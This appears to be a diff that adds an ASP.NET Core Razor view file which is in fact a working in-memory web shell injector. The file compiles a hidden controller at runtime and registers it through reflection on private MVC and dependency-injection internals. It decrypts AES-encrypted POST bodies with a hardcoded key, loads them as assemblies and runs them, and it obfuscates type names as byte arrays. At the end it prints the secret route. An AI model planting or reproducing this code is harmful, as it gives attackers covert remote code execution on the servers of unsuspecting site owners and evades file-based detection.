@@ -1,0 +1,142 @@
+@using System.Reflection.Emit
+@using System.Reflection
+@using System.Text
+@using Microsoft.AspNetCore.Http;
+@using Microsoft.Extensions.FileProviders
+@using Microsoft.Extensions.Primitives
+@using System;
+@using System.IO;
+@using System.Text
+@using Microsoft.CodeAnalysis.CSharp
+@using Microsoft.Extensions.DependencyInjection;
+@using Microsoft.CodeAnalysis
+@functions {
+	public Assembly Compile(string text)
+	{
+		Assembly.Load(new AssemblyName("System.Diagnostics.Process"));
+		var appDomain = AppDomain.CurrentDomain;
+		var assemblies = appDomain.GetAssemblies()
+			.Where(a => !a.IsDynamic && !string.IsNullOrEmpty(a.Location)) // 检查路径是否为空
+			.Select(a => a.Location)
+			.ToList();
+		var references = assemblies
+			.Select(location => Microsoft.CodeAnalysis.MetadataReference.CreateFromFile(location, default, null))
+			.Cast<MetadataReference>()
+			.ToList();
+		var options = new CSharpCompilationOptions(OutputKind.DynamicallyLinkedLibrary);
+		var assemblyName = "_" + Guid.NewGuid().ToString("D");
+		var syntaxTrees = new SyntaxTree[] { CSharpSyntaxTree.ParseText(text) };
+		var compilation = CSharpCompilation.Create(assemblyName, syntaxTrees, references, options);
+		using var stream = new MemoryStream();
+		var compilationResult = compilation.Emit(stream);
+		if (compilationResult.Success)
+		{
+			stream.Seek(0, SeekOrigin.Begin);
+			return Assembly.Load(stream.ToArray());
+		}
+
+		throw new InvalidOperationException("Compilation error");
+	}
+}
+
+@{
+    string action_name = "_" + Guid.NewGuid().ToString("D").Replace("-", "");
+    string controller_name = "_" + Guid.NewGuid().ToString("D").Replace("-", "");
+    string sourceCode = @"
+    using System.Diagnostics;
+    using System;
+	using Microsoft.AspNetCore.Mvc;
+	using Microsoft.AspNetCore.Http;
+	using System.Threading.Tasks;
+	
+	public class %controller_name%Controller: Controller
+	{
+		public static byte[] Decrypt(byte[] data)
+		{
+		    string key = ""e45e329feb5d925b"";
+		    data = Convert.FromBase64String(System.Text.Encoding.UTF8.GetString(data));
+		    System.Security.Cryptography.RijndaelManaged aes = new System.Security.Cryptography.RijndaelManaged();
+		    aes.Mode = System.Security.Cryptography.CipherMode.ECB;
+		    aes.Key = System.Text.Encoding.UTF8.GetBytes(key);
+		    aes.Padding = System.Security.Cryptography.PaddingMode.PKCS7;
+		    return aes.CreateDecryptor().TransformFinalBlock(data, 0, data.Length);
+		}
+
+		public static byte[] Encrypt(byte[] data)
+		{
+		    string key = ""e45e329feb5d925b"";
+		    System.Security.Cryptography.RijndaelManaged aes = new System.Security.Cryptography.RijndaelManaged();
+		    aes.Mode = System.Security.Cryptography.CipherMode.ECB;
+		    aes.Key = System.Text.Encoding.UTF8.GetBytes(key);
+		    aes.Padding = System.Security.Cryptography.PaddingMode.PKCS7;
+		    return System.Text.Encoding.UTF8.GetBytes(Convert.ToBase64String(aes.CreateEncryptor().TransformFinalBlock(data, 0, data.Length)));
+		}
+		public async Task<IActionResult> %action_name%()
+		{
+			if (this.HttpContext.Request.Method == ""POST"")
+            {
+                byte[] c = null;
+                this.HttpContext.Request.EnableBuffering();
+                using (var memoryStream = new System.IO.MemoryStream())
+                {
+                    await this.HttpContext.Request.Body.CopyToAsync(memoryStream);
+                    c = memoryStream.ToArray();
+                }
+                this.HttpContext.Request.Body.Position = 0;
+                string asname = System.Text.Encoding.ASCII.GetString(new byte[] { 0x53, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x2e, 0x52, 0x65, 0x66, 0x6c, 0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x2e, 0x41, 0x73, 0x73, 0x65, 0x6d, 0x62, 0x6c, 0x79 });
+                Type assembly = Type.GetType(asname);
+                var load = assembly.GetMethod(""Load"", new Type[] { new byte[0].GetType() });
+                object obj = load.Invoke(null, new object[] { @Decrypt(c) });
+                var create = assembly.GetMethod(""CreateInstance"", new Type[] { """".GetType() });
+                string name = System.Text.Encoding.ASCII.GetString(new byte[] { 0x55 });
+                object pay = create.Invoke(obj, new object[] { name });
+                this.HttpContext.Items.Add(""DecryptFunc"", Decrypt);
+                this.HttpContext.Items.Add(""EncryptFunc"", Encrypt);
+                pay.Equals(this.HttpContext);
+            }
+            return Ok();
+		}
+
+	}
+    ".Replace("%action_name%", action_name).Replace("%controller_name%", controller_name);
+
+    var assemblyShell = Compile(sourceCode);
+    var iActionDescriptorProviderList = (Microsoft.AspNetCore.Mvc.Abstractions.IActionDescriptorProvider[])this.Context.RequestServices.GetService(typeof(IEnumerable<>).MakeGenericType(typeof(Microsoft.AspNetCore.Mvc.Abstractions.IActionDescriptorProvider)));
+    var actionDescriptorProvider = iActionDescriptorProviderList.FirstOrDefault(m => m.GetType().FullName.Equals("Microsoft.AspNetCore.Mvc.ApplicationModels.ControllerActionDescriptorProvider"));
+    var partManager = actionDescriptorProvider.GetType().GetField("_partManager", BindingFlags.NonPublic | BindingFlags.Instance).GetValue(actionDescriptorProvider);
+    var applicationParts = (List<Microsoft.AspNetCore.Mvc.ApplicationParts.ApplicationPart>)partManager.GetType().GetProperty("ApplicationParts").GetValue(partManager);
+    var assemblyPartType = typeof(Microsoft.AspNetCore.Mvc.ApplicationParts.AssemblyPart);
+    var assemblyPart = (Microsoft.AspNetCore.Mvc.ApplicationParts.AssemblyPart) Activator.CreateInstance(assemblyPartType, assemblyShell);
+    applicationParts.Add(assemblyPart); // 添加到ApplicationParts
+
+    this.Context.RequestServices.GetService(typeof(Microsoft.AspNetCore.Mvc.Infrastructure.IActionDescriptorCollectionProvider)).GetType().GetMethod("UpdateCollection", BindingFlags.NonPublic | BindingFlags.Instance).Invoke(this.Context.RequestServices.GetService(typeof(Microsoft.AspNetCore.Mvc.Infrastructure.IActionDescriptorCollectionProvider)), null);
+    
+    var requestServices = this.Context.RequestServices;
+    // 程序集中定义的Controller
+    Type controllerType =assemblyShell.DefinedTypes.FirstOrDefault(t => t.FullName.Contains("Controller"));
+    // 获取 ServiceIdentifier 类型
+    Type serviceIdentifierType = requestServices.GetType().Assembly.DefinedTypes.ToArray().FirstOrDefault(m => m.FullName.Equals("Microsoft.Extensions.DependencyInjection.ServiceLookup.ServiceIdentifier"));
+    var fromServiceTypeMethod = serviceIdentifierType.GetMethod("FromServiceType");
+    var rootProvider = requestServices.GetType().GetProperty("RootProvider", BindingFlags.NonPublic | BindingFlags.Instance).GetValue(requestServices);
+    // ServicesAccessor集合
+    var serviceAccessors = rootProvider.GetType().GetField("_serviceAccessors", BindingFlags.NonPublic | BindingFlags.Instance).GetValue(rootProvider);
+    var tryAddMethod = serviceAccessors.GetType().GetMethod("TryAdd");
+    // new ServiceIdentifier
+    var _controllerServiceIdentifierType = fromServiceTypeMethod.Invoke(null, new object[] { controllerType });
+    Type serviceAccessorType = requestServices.GetType().Assembly.DefinedTypes.ToArray()
+        .FirstOrDefault(m => m.FullName.Equals("Microsoft.Extensions.DependencyInjection.ServiceProvider"))
+        .GetNestedTypes(BindingFlags.NonPublic).FirstOrDefault(m => m.FullName.Contains("ServiceProvider+ServiceAccessor"));
+    // 自定义 ServicesAccessor 返回服务实例的行为
+    // Func<object?, object?> func = _ => Activator.CreateInstance(controllerType);
+    Func<object?, object?> func = _ =>
+    {
+	    return controllerType.GetConstructors().FirstOrDefault().Invoke(null);
+    };
+    // 创建自定义 ServicesAccessor
+    var serviceAccessor = Activator.CreateInstance(serviceAccessorType);
+    serviceAccessorType.GetProperty("RealizedService").SetValue(serviceAccessor, func);
+    // 添加自定义 ServicesAccessor
+    tryAddMethod.Invoke(serviceAccessors,  new object[]{_controllerServiceIdentifierType, serviceAccessor});
+    
+    this.Context.Response.WriteAsync("/" + controller_name + "/" + action_name);
+}
